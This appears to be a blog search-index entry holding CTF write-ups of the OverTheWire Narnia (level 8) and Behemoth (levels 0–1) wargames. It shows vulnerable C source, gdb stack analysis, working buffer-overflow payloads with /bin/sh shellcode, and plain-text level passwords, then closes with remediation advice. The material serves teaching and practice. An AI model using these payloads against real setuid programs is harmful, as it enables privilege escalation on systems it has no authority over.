etc narnia pass narnia8mohthuphog   endhighlightSource Codehighlight c  include  stdio h  include  stdlib h  include  string h  include  stdlib h  include  unistd hint goodfunction   int hackedfunctionint vuln const char  format         char buffer 128         int   ptrf           memset buffer  0  sizeof buffer          printf  goodfunction      pn   goodfunction         printf  hackedfunction      pnn   hackedfunction   ptrf   goodfunction        printf  before   ptrf      p   p n   ptrf   ptrf         printf  I guess you want to come to the hackedfunction   n        sleep 2       ptrf   goodfunction        snprintf buffer  sizeof buffer  format         return ptrf       int main int argc  char   argv         if  argc    1                 fprintf stderr   Usage   s  buffer n   argv 0                  exit  1               exit vuln argv 1      int goodfunction          printf  Welcome to the goodfunction  but i said the Hackedfunction  n          fflush stdout         return 0int hackedfunction          printf  Way to go                  fflush stdout         setreuid geteuid   geteuid           system   bin sh          return 0endhighlightNarnia 8After exploiting a total of eight binaries  we are left with the task of exploiting the ninth and final binary  narnia8Binary AnalysisWe can start by executing the binary to see how it behaveshighlight bash narnia8 narnia  narnia    narnia8  narnia8 argument   endhighlightSimilar to the previous binaries  this program expects an argument  Providing a normal input does not seem to do anything except print that same value back outhighlight bash narnia8 narnia  narnia    narnia8 AA   endhighlightFurthermore  when providing a large input such as 5000  A s  no segmentation fault occurred GhidraWe can further analyse this binary using Ghidra to understand the inner workings of the program reports Narnia image6 png There are two interesting functions  main and func  The main function simply gets the argument and passes it into func  Within this function are 2 global variables  local 1c and local 8  Twenty bytes are allocated to the former  while the latter is set to the argument  The local 1c variable has all of its contents set to 0  Within the while loop appears to be a sort of operation that is setting local 1c equivalent to some index within local 8  Just as in the previous binaries  Ghidra may have mistook a for loop for a while loop  It is possible that this segment in the code actually looks like the followinghighlight c for i 0  local 8 i      0   ilocal 1c i    local 8 i     i   i   1endhighlightAfter performing this operation  the program prints the contents of local 1c  Looking at this for loop  we can see that the vulnerability lies within the fact that 20 bytes are allocated to the local 1c variable  but an argument of greater than 20 bytes can be inputtedAdditionally  running checksec on the binary reveals that the NX bit is also disabledhighlight bash    0xd4y Writeup     business other overthewire narnia 8       checksec narnia8      home 0xd4y business other overthewire narnia 8 narnia8    Arch      i386 32 little   RELRO     No RELRO   Stack     No canary found   NX        NX disabled   PIE       No PIE  0x8048000    RWX       Has RWX segments   endhighlightTherefore  the return address of func could potentially be overwritten to point to shellcodeBuffer OverflowPassing a large input into the argument of the program did not result in a segmentation fault GdbThe program can be analyzed in a dynamic environment using gdb  This will help in further understanding how the binary works  Before providing an input  we must first put a break point toward the end of func right before the program exitshighlight bash pwndbg  disass func                                                                                                                                                Dump of assembler code for function func                                                                                                                                       0x0804841b   0       push   ebp                                                                                                                                             0x0804841c   1       mov    ebp esp                                                                                                                                         0x0804841e   3       sub    esp 0x18                                                                                                                                       0x08048421   6       mov    eax DWORD PTR  ebp 0x8                                   0x08048424   9       mov    DWORD PTR  ebp 0x4  eax                                                                                                                         0x08048427   12      push   0x14                                                     0x08048429   14      push   0x0                                                     0x0804842b   16      lea    eax  ebp 0x18                                           0x0804842e   19      push   eax                                                     0x0804842f   20      call   0x8048300  memset plt                                                                                                                           0x08048434   25      add    esp 0xc                                                 0x08048437   28      mov    DWORD PTR ds 0x80497b0 0x0                               0x08048441   38      jmp    0x8048469  func 78                                       0x08048443   40      mov    eax ds 0x80497b0                                         0x08048448   45      mov    edx DWORD PTR ds 0x80497b0                                                                                                                     0x0804844e   51      mov    ecx edx                                                                                                                                         0x08048450   53      mov    edx DWORD PTR  ebp 0x4                                   0x08048453   56      add    edx ecx                                                 0x08048455   58      movzx  edx BYTE PTR  edx                                       0x08048458   61      mov    BYTE PTR  ebp eax 1 0x18  dl  0x0804845c   65      mov    eax ds 0x80497b0  0x08048461   70      add    eax 0x1  0x08048464   73      mov    ds 0x80497b0 eax  0x08048469   78      mov    eax ds 0x80497b0       0x0804846e   83      mov    edx eax  0x08048470   85      mov    eax DWORD PTR  ebp 0x4   0x08048473   88      add    eax edx  0x08048475   90      movzx  eax BYTE PTR  eax   0x08048478   93      test   al al  0x0804847a   95      jne    0x8048443  func 40   0x0804847c   97      lea    eax  ebp 0x18   0x0804847f   100     push   eax  0x08048480   101     push   0x8048550  0x08048485   106     call   0x80482e0  printf plt   0x0804848a   111     add    esp 0x8  0x0804848d   114     nop  0x0804848e   115     leave   0x0804848f   116     ret    endhighlightA breakpoint was then set at the nop operation  and an input of 5 A s was passed  this amount was chosen arbitrarilyhighlight bash pwndbg  b  0x0804848d                                                                                                                                                        Breakpoint 1 at 0x804848d                                                                                                                                                    pwndbg  r   python  c  print  A  5                                                                                                                                          Starting program   home 0xd4y business other overthewire narnia 8 narnia8   python  c  print  A  5                                                                          AAAAABreakpoint 1  0x0804848d in func                                                                                                                                            endhighlight  Local 8 Address BehaviorThe stack pointer can now be analyzedhighlight bash pwndbg  x 40x  esp0xffffd044      0x41414141      0x00000041      0x00000000      0x000000000xffffd054      0x00000000      0xffffd2f9      0xffffd068      0x080484a70xffffd064      0xffffd2f9      0x00000000      0xf7ddfe46      0x000000020xffffd074      0xffffd114      0xffffd120      0xffffd0a4      0xffffd0b4   endhighlightNote how there are 5 A s starting at 0xffffd044 followed by 15 0 bytes  The 0 s are a result of the memset function  These 0 s are then followed by the 0xffffd2f9 address  Examining this address reveals that it is pointing to the local 8 bufferhighlight bash pwndbg  x s 0xffffd2f90xffffd2f9       AAAAA    endhighlightInterestingly  running the program again but inputting 6 A s instead of 5 results in a decrement of 1 to the local 8 addresshighlight bash pwndbg  x 40x  esp0xffffd044      0x41414141      0x00004141      0x00000000      0x000000000xffffd054      0x00000000      0xffffd2f8      0xffffd068      0x080484a70xffffd064      0xffffd2f8      0x00000000      0xf7ddfe46      0x00000002   endhighlightFurthermore  when inputting more than 20 bytes  the address of local 8 gets overwritten by one bytehighlight bash 0xffffd034      0x41414141      0x41414141      0x41414141      0x414141410xffffd044      0x41414141      0xffffd241      0xffffd058      0x080484a7   endhighlightHowever  when exactly 20 bytes are inputted followed by the address of local 8 and some junk  we are able to flood into other areas of memoryPayloadA 20   ADDRESS TO LOCAL 8    A  6When we passed 6 A s into the buffer  the address to local 8 was 0xfffd2f8  If we are to input 14 more A s followed by the address to local 8  which is four bytes  followed by another 6 A s  then the resulting address to local 8 would be 0xffffd2f8    14 4 6highlight bash     hex 0xffffd2f8 24  0xffffd2e0    endhighlightUsing this address  we can construct the payload as followshighlight bash pwndbg  r   python  c  print  A  20  xe0xd2xffxff   A  6  Starting program   home 0xd4y business other overthewire narnia 8 narnia8   python  c  print  A  20  xe0xd2xffxff   A  6  AAAAAAAAAAAAAAAAAAAAAAAAAABreakpoint 1  0x0804848d in func                                              endhighlightNow looking at the stack pointer  we see that we have successfully flooded memory past the local 8 addresshighlight bash pwndbg  x 40x  esp0xffffd024      0x41414141      0x41414141      0x41414141      0x414141410xffffd034      0x41414141      0xffffd2e0      0x41414141      0x080441410xffffd044      0xffffd2e0      0x00000000      0xf7ddfe46      0x00000002   endhighlightIncidentally  the reason why we were only able to overwrite other areas of memory only after including the address of the buffer in the payload  is because of the for loop within the program  When the address to local 8 is overwritten  the for loop is false and data stops getting written to local 1c  Overwriting func Return AddressIt is important to note that in the stack pointer  the return address of func is present shortly after the bufferhighlight bash pwndbg  x 40x  esp                                                                                                                                                           0xffffd034      0x41414141      0x41414141      0x41414141      0x41414141                                                                                                   0xffffd044      0x41414141      0xffffd2ea      0xffffd058      0x080484a7                                                                                                   0xffffd054      0xffffd2ea      0x00000000      0xf7ddfe46      0x00000002                                                                                                   0xffffd064      0xffffd104      0xffffd110      0xffffd094      0xffffd0a4                                                                                                   0xffffd074      0xf7ffdb40      0xf7fcb410      0xf7fa6000      0x00000001                                                                                                   0xffffd084      0x00000000      0xffffd0e8      0x00000000      0xf7ffd000                                                                                                   0xffffd094      0x00000000      0xf7fa6000      0xf7fa6000      0x00000000                                                                                                   0xffffd0a4      0xe752d891      0xa309e681      0x00000000      0x00000000           0xffffd0b4      0x00000000      0x00000002      0x08048320      0x00000000                                                                                                   0xffffd0c4      0xf7fe9740      0xf7fe4080      0xf7ffd000      0x00000002                                                                                                                                                                                                                                                                                                                                                                                        endhighlightMore specifically  it is at 0x080484a7highlight bash pwndbg  x x 0x080484a7                                                                                                                                                       0x80484a7  main 23      0x83    endhighlightWe can verify that this is the return address of func by disassembling the main functionhighlight bash pwndbg  disass mainDump of assembler code for function main   0x08048490   0       push   ebp  0x08048491   1       mov    ebp esp  0x08048493   3       cmp    DWORD PTR  ebp 0x8  0x1  0x08048497   7       jle    0x80484ac  main 28   0x08048499   9       mov    eax DWORD PTR  ebp 0xc   0x0804849c   12      add    eax 0x4  0x0804849f   15      mov    eax DWORD PTR  eax   0x080484a1   17      push   eax  0x080484a2   18      call   0x804841b  func   0x080484a7   23      add    esp 0x4  0x080484aa   26      jmp    0x80484bf  main 47   0x080484ac   28      mov    eax DWORD PTR  ebp 0xc   0x080484af   31      mov    eax DWORD PTR  eax   0x080484b1   33      push   eax  0x080484b2   34      push   0x8048554  0x080484b7   39      call   0x80482e0  printf plt   0x080484bc   44      add    esp 0x8  0x080484bf   47      mov    eax 0x0  0x080484c4   52      leave   0x080484c5   53      ret   End of assembler dump    endhighlightNote that main 23 comes right after the call to func  Therefore  if we overwrite this return address of func to the address of the shellcode  just as we did in  Narnia 2   h e4mp3rcoeyar  and  Narnia 4   h 125dslwuwfyp    then the shellcode will be executed consequently giving a shell as the narnia9 user ShellcodeNow on the target machine  we can run the narnia8 binary with an input of 20 A s and pipe it over to xxd to get the address of local 8highlight bash narnia8 narnia  narnia    narnia8   python  c  print  A  20   xxd                    00000000  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA                  00000010  4141 4141 d1d7 ffff e8d5 ffff a784 0408  AAAA                                                                                                                      00000020  d1d7 ffff 0a   endhighlightHere we can see that local 8 is located at 0xffffd7d1  Subtracting this address by 4 bytes  local 8c address    4 bytes  junk    4 bytes  shellcode address    33 bytes  shellcode  13    ftnt13    we get the local 8 address as 0xffffd7a4highlight bash     hex 0xffffd7d1  4 4 4 33   0xffffd7a4    endhighlightTo calculate the address of the shellcode  we add 20 to the local 8 address to account for 20 A s   4  address of local 8    4  junk    4  address of shellcodehighlight bash     hex 0xffffd7a4 20 4 4 4  0xffffd7c4    endhighlightTherefore  the address of the shellcode is at 0xffffd7c4  Finally  the payload can be passed as the argumenthighlight bash narnia8 narnia  narnia    narnia8   python  c  print  A  20  xa4xd7xffxff   x90  4  xc4xd7xffxff   x6ax0bx58x99x52x66x68x2dx70x89xe1x52x6ax68x68x2fx62x61x73x68x2fx62x69x6ex89xe3x52x51x53x89xe1xcdx80                 AAAAAAAAAAAAAAAAAAAAj                    XRfh pRjhh bash binRQSbash 4 4  whoaminarnia9bash 4 4  cat  etc narnia pass narnia9eiL5fealae   endhighlightSource Codehighlight c  include  stdio h  include  stdlib h  include  string h    gcc s variable reordering messed things up   to keep the level in its old style i am   making  i  global until i find a fix    morlaint i void func char  b         char  blah b        char bok 20           int i 0        memset bok   0   sizeof bok          for i 0  blah i      0   i                  bok i  blah i         printf   sn  bokint main int argc  char   argv         if argc   1                func argv 1          else       printf   s argumentn   argv 0          return 0Looking at the code  the assumption that the while loop in func found by Ghidra is actually a for loop proved to be correct    endhighlightConclusionBinaries with setuid permissions must be carefully examined before other users are given execute permissions  Every binary was vulnerable to exploitation using well known techniques  among them being re2libc  format string exploitation  and shellcode injection  The following remediations will strengthen the security of every tested binaryPerform boundary checks before passing user input into functionsAlmost every binary outlined in this report was vulnerable due to failure of checking boundariesSensitive memory addresses were overwritten allowing ret2libc among other attacksUnnecessary disabling NX bitThe NX bit was unnecessarily disabled for multiple binaries resulting in shellcode injectionUntrusted user input was directly passed to functionsTwo out of nine binaries  namely  Narnia 5   h n6g8yeh9n8qz  and  Narnia 7   h v80flpijk1ef   passed unsanitized user input directly to snprintf without boundary checksSETUID permissions for every binary tested in this report should be removed immediately until the remediations outlined above are observed1    ftnt ref1   https   github com pwndbg pwndbg  https   www google com url q https   github com pwndbg pwndbg sa D source editors ust 1653862984872073 usg AOvVaw07wgHBOn f2dXgmrpnyRoj2    ftnt ref2   https   ghidra sre org   https   www google com url q https   ghidra sre org  sa D source editors ust 1653862984872392 usg AOvVaw0msoGRWifjfkM2dp4THiuH3    ftnt ref3   https   owasp org www community attacks Buffer Overflow via Environment Variables  https   www google com url q https   owasp org www community attacks Buffer Overflow via Environment Variables sa D source editors ust 1653862984868000 usg AOvVaw2QXKRmYG3aCVGXK9 bV6HA4    ftnt ref4   https   www tutorialspoint com c standard library c function getenv htm  https   www google com url q https   www tutorialspoint com c standard library c function getenv htm sa D source editors ust 1653862984868560 usg AOvVaw27HBGXaqv75 J9BA1A50Uo5    ftnt ref5   http   shell storm org shellcode files shellcode 827 php  https   www google com url q http   shell storm org shellcode files shellcode 827 php sa D source editors ust 1653862984868922 usg AOvVaw2itnxCU tXAxYbyR6QWgBV6    ftnt ref6   http   shell storm org shellcode files shellcode 606 php  https   www google com url q http   shell storm org shellcode files shellcode 606 php sa D source editors ust 1653862984869310 usg AOvVaw1C3u0fG8sz2m8SbTL12HTG7    ftnt ref7  https   avinetworks com wp content uploads 2020 06 buffer overflow diagram png8    ftnt ref8   https   i stack imgur com Ewkn1 png  https   www google com url q https   i stack imgur com Ewkn1 png sa D source editors ust 1653862984869804 usg AOvVaw1 DA48hDTfj3VQfoFpmDb39    ftnt ref9   http   shell storm org shellcode files shellcode 606 php  https   www google com url q http   shell storm org shellcode files shellcode 606 php sa D source editors ust 1653862984870174 usg AOvVaw0AWM8H FYxkGL7Ab1eHwsm10    ftnt ref10   https   en wikipedia org wiki Bounds checking  https   www google com url q https   en wikipedia org wiki Bounds checking sa D source editors ust 1653862984870513 usg AOvVaw2rvnaJcDa4du8 0Pqy9hzf11    ftnt ref11   https   stackoverflow com questions 1270387 are snprintf and friends safe to use    text It 20is 20safe 20as 20you correct 20length 20for 20the 20buffer  text snprintf 20does 20guarantee 20that 20the does 20not 20guarantee 20null 2Dtermination  https   www google com url q https   stackoverflow com questions 1270387 are snprintf and friends safe to use 23   text 3DIt 2520is 2520safe 2520as 2520you correct 2520length 2520for 2520the 2520buffer  26text 3Dsnprintf 2520does 2520guarantee 2520that 2520the does 2520not 2520guarantee 2520null 252Dtermination sa D source editors ust 1653862984870947 usg AOvVaw1pKYSTNQoLdc42xOB6VMYF12    ftnt ref12   https   en wikipedia org wiki Return to libc attack  https   www google com url q https   en wikipedia org wiki Return to libc attack sa D source editors ust 1653862984871326 usg AOvVaw2gnWXzZHxixH18eYFpck 313    ftnt ref13   http   shell storm org shellcode files shellcode 606 php  https   www google com url q http   shell storm org shellcode files shellcode 606 php sa D source editors ust 1653862984871694 usg AOvVaw1O3ARlZIEGI0 71Bi 8KYU",
      "image": "/images/narnia.jpg"
    } ,
  
    {
      "title"    : "Behemoth Writeup",
      "category" : "",
      "tags"     : "",
      "url"      : "/2021/04/20/Behemoth-Writeup/",
      "date"     : "Apr 20, 2021",
      "content"  : "layout  posttitle   Behemoth Writeupdescription  Behemoth is the sequel to Narnia and is rated to be slightly harder  In comparison to Narnia  it involved more reverse engineering exercises and required more knowledge of C  Each binary contained a different vulnerability ranging from PATH environment variable privilege escalation to buffer overflows  format string exploits  and bypassing shellcode filtering date    2021 04 20image     images 0xd4y logo gray png tags     Format String  Shellcode Filter Bypass  PATH privesc  Buffer Overflow  Shellcode  Binary ExploitationThis report can be read both on this site  and as its  a href    https   0xd4y.com reports Behemoth 20Writeup pdf  original report form  a   It is highly recommended that you read the original report form instead because it is better formattedBehemothA look into the exploitation of vulnerable binaries    images 0xd4y logo gray png 0xd4yApril 20  20210xd4y WriteupsLinkedIn   https   www linkedin com in segev eliezer   https   www google com url q https   www linkedin com in segev eliezer  sa D source editors ust 1653865765679122 usg AOvVaw20yVe9TZbNRrit5cjCh7laEmail   0xd4yWriteups gmail com  mailto 0xd4yWriteups gmail comWeb   https   0xd4y.com   https   www google com url q https   0xd4y.com Writeups  sa D source editors ust 1653865765679892 usg AOvVaw23x5CqH5aRkEdVU5Z7lpKmTable of ContentsExecutive Summary   h skkcx3243q92          3   h skkcx3243q92Attack Narrative   h y7voaxif6jkg          4   h y7voaxif6jkgBehemoth 0   h 777qhcmdltsz          4   h 777qhcmdltszBehemoth 1   h 2eaegv275h63          5   h 2eaegv275h63Method 1   h vs95uriulwwh          8   h vs95uriulwwhPOC   h 27qtgfoy0njb          9   h 27qtgfoy0njbShellcode Execution   h vkme7fphqreh          9   h vkme7fphqrehMethod 2   h lu6rrk3nt1i          12   h lu6rrk3nt1iBehemoth 2   h 9e7hwp9wx39h          13   h 9e7hwp9wx39hBinary Analysis   h 7p5xlkqevfbu          13   h 7p5xlkqevfbuBehavior   h x3bq9jsdb8v7          13   h x3bq9jsdb8v7Ghidra   h oynz5ozays6k          13   h oynz5ozays6kBinary Exploitation   h er0aqui9c1x          15   h er0aqui9c1xPath Privesc  Touch    h 9vyv757ij9yj          15   h 9vyv757ij9yjPath Privesc  Cat    h pshhhr55tmpg          15   h pshhhr55tmpgSymbolic Link   h 6af8invi43tw          16   h 6af8invi43twBehemoth 3   h iwgdpudcydgl          17   h iwgdpudcydglBinary Analysis   h sazhas4fyil          17   h sazhas4fyilBehavior   h cpklvm5s2jrm          17   h cpklvm5s2jrmGhidra   h s2k22fdd1mwn          18   h s2k22fdd1mwnDiscovery of Format String Vulnerability   h mez1g56y3rvw          19   h mez1g56y3rvwMemory Addresses of Useful Functions   h u0pizz3c8rpk          19   h u0pizz3c8rpkOverwriting Puts   h 3jzjlah745hv          20   h 3jzjlah745hvConstructing Payload With GDB   h 4zk650y4xnzm          20   h 4zk650y4xnzmExploit Development   h jagnc9qowxus          21   h jagnc9qowxusControlling Puts Address   h icza0znvroe2          22   h icza0znvroe2Popping a Shell   h z7u0fjslsnt8          24   h z7u0fjslsnt8Behemoth 4   h eoybw49l4xbw          25   h eoybw49l4xbwBinary Analysis   h c5nq5aylye9u          26   h c5nq5aylye9uBehavior   h eu475ejo4tfp          26   h eu475ejo4tfpGhidra   h vx8y9qi7edp2          26   h vx8y9qi7edp2Binary Exploitation   h rmftonkmrg2x          27   h rmftonkmrg2xSymbolic Link Attack   h c06ihpx7yw4e          27   h c06ihpx7yw4eBehemoth 5   h 7apgrhmap56f          28   h 7apgrhmap56fBinary Analysis   h snnuhjwulxzn          28   h snnuhjwulxznGhidra   h yodf5dnlygui          28   h yodf5dnlyguiCatching Behemoth6 Password Through UDP   h ucvx5cuzou25          31   h ucvx5cuzou25Behemoth 6   h 1iiwc3vpzmaj          31   h 1iiwc3vpzmajGhidra   h tihwa7xhbihg          32   h tihwa7xhbihgAbusing popen     h fngzaxqi0ncb          33   h fngzaxqi0ncbBehemoth 7   h tqwpdz749mlq          34   h tqwpdz749mlqBinary Analysis   h xjoju0hpie6u          34   h xjoju0hpie6uBehavior   h lza0jils5m5d          34   h lza0jils5m5dGhidra   h 88k4lr9djkg2          35   h 88k4lr9djkg2Constructing Payload   h ltv1zu8li5yq          37   h ltv1zu8li5yqCalculating EIP Offset   h brbnafv8klgo          37   h brbnafv8klgoShellcode Address   h vmauwlddokdj          38   h vmauwlddokdjFinal Payload   h gb02temjdnc4          39   h gb02temjdnc4Conclusion   h i7o2yd759joa          41   h i7o2yd759joaExecutive SummaryIn contrast to  Narnia  https   www google com url q https   0xd4y.com Writeups Misc Narnia 2520Writeup pdf sa D source editors ust 1653865765692359 usg AOvVaw1Xq8CpHqiNKgfYHfxwYd2z   the source code for each binary is not given   Nevertheless  all eight binaries were successfully analyzed and exploited  Attack techniques such as shellcode injection  format string exploitation  and path privilege escalation are covered in this report  Some binaries were more of a reverse engineering exercise   Behemoth 5   h 7apgrhmap56f  and  Behemoth 6   h 1iiwc3vpzmaj  for example  while others typically involved buffer overflow and format string exploits such as in  Behemoth 7   h tqwpdz749mlq   a challenge which showcases an interesting way of bypassing shellcode filtersThe binaries were mainly vulnerable due to a lack of boundary checks and input validation  It is critical that the SETUID bits of these binaries are removed until the remedies in the  Conclusion   h i7o2yd759joa  section are observed  Below is the full listing of all passwords obtained from the compromised usersUsernamePasswordbehemoth0behemoth0behemoth1aesebootivbehemoth2eimahquuofbehemoth3nieteidielbehemoth4ietheisheibehemoth5aizeeshingbehemoth6mayiroechebehemoth7baquoxuafobehemoth8pheewij7AeAttack NarrativeThe credentials to the first user  behemoth0  was given as behemoth0  the credentials are behemoth0 behemoth0   The ssh service is open on port 2221  and this ssh session provided the means for allowing the analysis of the binaries discussed in this reportBehemoth 0Running the strings command on the binary reveals some interesting strings reports Behemoth image2 png However  trying any of these potential passwords results in an  Access denied    message  Using ltrace  a library call tracer  the system calls of the binary can be seen upon inputting a passwordhighlight bash        0xd4y Writeup     business other overthewire behemoth 0       ltrace   behemoth0  libc start main 0x80485b1  1  0xffbafd14  0x8048680  unfinished     printf  Password                                           10  isoc99 scanf 0x804874c  0xffbafc0b  0xf7f3e000  0Password  123        1strlen  OK GSYBEX Y                                        11strcmp  123    eatmyshorts                                  1puts  Access denied   Access denied                                       16    exited  status 0      endhighlightThe binary is comparing the user input to the secret password by using the strcmp  string compare  function  Trying out the eatmyshorts password  we are given access to the next level reports Behemoth image5 png Behemoth 1Now with a shell as the behemoth1 user  we can maintain persistence by grabbing the password from  etc behemoth pass directoryRunning the behemoth1 binary  the following output can be seen reports Behemoth image6 png After downloading the binary and using ltrace  the following output is foundhighlight bash    0xd4y Writeup     business other overthewire behemoth 1       ltrace   behemoth1  libc start main 0x804844b  1  0xffc01bc4  0x8048480  unfinished     printf  Password                                           10gets 0xffc01ad5  0xf7f11080  0  0xf7d25b7ePassword  a                 0xffc01ad5puts  Authentication failure nSorry  Authentication failure Sorry                      31    exited  status 0      endhighlightThis binary is a little bit more secure in the sense that the password is not exposed by the strcmp function  Before trying to reverse engineer this binary  it is important to check for possible buffer overflow vulnerabilities  This can be done by sending a large input as followshighlight bash    0xd4y Writeup     business other overthewire behemoth 1       python  c  print  A  1000  xclip  sel clipbehemoth1 behemoth  behemoth    behemoth1Password  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAuthentication failure Sorry Segmentation fault   endhighlightThe program was successfully crashed by sending a large input as can be seen from the  Segmentation fault  error  This is a strong indicator of a potential buffer overflow vulnerabilityhighlight bash    0xd4y Writeup     business other overthewire behemoth 1                                                                                                                         gdb   behemoth1   q                                                                                                                                                    pwndbg  loaded 196 commands  Type pwndbg  filter  for a list                                                                                                                 pwndbg  created  rebase   ida gdb functions  can be used with print break                                                                                                   Reading symbols from   behemoth1                                                                                                                                              No debugging symbols found in   behemoth1                                                                                                                                   pwndbg  r     cyclic 1000                                                                                                                                                   Starting program   home 0xd4y business other overthewire behemoth 1 behemoth1     cyclic 1000                                                                               Password  Authentication failure                                                                                                                                             SorryProgram received signal SIGSEGV  Segmentation fault                                                                                                                         0x61617361 in                                                                                                                                                                 endhighlightNote how the cyclic function was used to help determine where the offset isThe output confirms the suspicion that this binary is vulnerable to a buffer overflow attack  Looking at the return address at the bottom of the result  it can be seen that the binary is looking for an address of 0x61617361  The offset can be calculated using the cyclic  l operation as followshighlight bash    0xd4y Writeup     business other overthewire behemoth 1       cyclic  l 0x6161736171   endhighlightThe offset is the amount of bytes that a binary can take before overwriting the instruction pointer  the register which points to which part of the code should be executed next   Observe from the hex addresses that this is a 32 bit binary  The file command can be used as well to verify thishighlight bash    0xd4y Writeup     business other overthewire behemoth 1       file behemoth1behemoth1  ELF 32 bit LSB executable  Intel 80386  version 1  SYSV   dynamically linked  interpreter  lib ld linux so 2  for GNU Linux 2 6 32  BuildID sha1  7e13226f3c05594af2cf29fe34c92cc55047eb94  not stripped   endhighlightThis binary is not stripped meaning the debug symbols  1    ftnt1  of the binary can be gathered  Additionally  the binary s security can be analyzed with the checksec command reports Behemoth image13 png Seeing as this binary has NX  non execute  disabed  shellcode can be written into memory and the binary will execute it  provided that the payload is formatted correctly   With the knowledge that arbitrary code can be executed and that the instruction pointer can be controlled  the binary can be exploited by using shellcodehighlight bash pwndbg  r     python  c  print  A  71  B  4                                            Starting program   home 0xd4y business other overthewire behemoth 1 behemoth1     python  c  print  A  71  B  4  Password  Authentication failure                                                     SorryProgram received signal SIGSEGV  Segmentation fault 0x42424242 in       endhighlightNote how the return address was successfully controlled  42 is the hex value for BFor the sake of learning more about binary exploitation  I will go over two different methods of pwningMethod 1We can create a payload that has the following structureJUNK BYTES   ADDRESS TO SHELLCODE    NOP SLED   SHELLCODEThen this payload can be inputted to the binary and it will execute the shellcode  There are many different kinds of shellcodes that can be used  however a simple  bin sh shellcode  2    ftnt2   which will return a shell upon execution  The next task is to determine where the address of the shellcode will be POChighlight bash pwndbg  r     python  c  print  A  71  B  4  C  23  pwndbg  x 100x  esp 100                                                                                                                                                      0xffffcfdc      0x00000000      0xf7fa6000      0xf7fa6000      0xffffd038            0xffffcfec      0x08048474      0x0804850c      0x41414180      0x41414141            0xffffcffc      0x41414141      0x41414141      0x41414141      0x41414141            0xffffd00c      0x41414141      0x41414141      0x41414141      0x41414141            0xffffd01c      0x41414141      0x41414141      0x41414141      0x41414141            0xffffd02c      0x41414141      0x41414141      0x41414141      0x41414141            0xffffd03c      0x42424242      0x43434343      0x43434343      0x43434343                                                                                                  0xffffd04c      0x43434343      0x43434343      0x00434343      0xf7fcb410                                                                                                   endhighlightNote A is 41  B is 42  and C is 43 in hexLooking at the output of the esp register  the register responsible for pointing to the top of the stack  observe that the shellcode  in this case 43  will start at the second column of 0xffffd03c  Thus the address of the shellcode will be 0xffffd03c   4  each column corresponds to 4 bytes  which equals 0xffffd040 Shellcode ExecutionWith the knowledge of how buffer overflow attacks work  we can now continue with exploiting the behemoth binary on the target systemhighlight bash  gdb  disass main                                                                    Dump of assembler code for function main                                               0x0804844b   0       push    ebp                                                    0x0804844c   1       mov     esp  ebp                                                0x0804844e   3       sub     0x44  esp                                              0x08048451   6       push    0x8048500                                               0x08048456   11      call   0x8048300  printf plt                       0x0804845b   16      add     0x4  esp                                                0x0804845e   19      lea     0x43  ebp   eax                                        0x08048461   22      push    eax                                                    0x08048462   23      call   0x8048310  gets plt                                     0x08048467   28      add     0x4  esp                                                0x0804846a   31      push    0x804850c                                               0x0804846f   36      call   0x8048320  puts plt                                     0x08048474   41      add     0x4  esp                                                0x08048477   44      mov     0x0  eax                                                0x0804847c   49      leave                                                          0x0804847d   50      ret                                                          End of assembler dump                                                                  gdb  b  0x08048462                                                                  Breakpoint 1 at 0x8048462                                                             gdb  r     python  c  print  A  71   xc0xd5xffxff   x90  100  x31xc0x50x68x2fx2fx73x68x68x2fx62x69x6ex89xe3x50x53x89xe1xb0x0bxcdx80   Starting program   behemoth behemoth1     python  c  print  A  71   xc0xd5xffxff   x90  100  x31xc0x50x68x2fx2fx73x68x68x2fx62x69x6ex89xe3x50x53x89xe1xb0x0bxcdx80Breakpoint 1  0x08048462 in maingdb  sSingle stepping until exit from function mainwhich has no line number informationPassword  Authentication failureSorry0xffffd5c0 in                                                                   endhighlightNow that the binary s memory has been flooded  the ESP register can be checked to see which address marks the start of the shellcodehighlight bash  gdb  x 100x  esp 1000xffffd55c      0x00000000      0x00000001      0xf7fc5000      0xffffd5b80xffffd56c      0x08048474      0x0804850c      0x41414154      0x414141410xffffd57c      0x41414141      0x41414141      0x41414141      0x414141410xffffd58c      0x41414141      0x41414141      0x41414141      0x414141410xffffd59c      0x41414141      0x41414141      0x41414141      0x414141410xffffd5ac      0x41414141      0x41414141      0x41414141      0x414141410xffffd5bc      0xffffd5c0      0x90909090      0x90909090      0x909090900xffffd5cc      0x90909090      0x90909090      0x90909090      0x909090900xffffd5dc      0x90909090      0x90909090      0x90909090      0x909090900xffffd5ec      0x90909090      0x90909090      0x90909090      0x909090900xffffd5fc      0x90909090      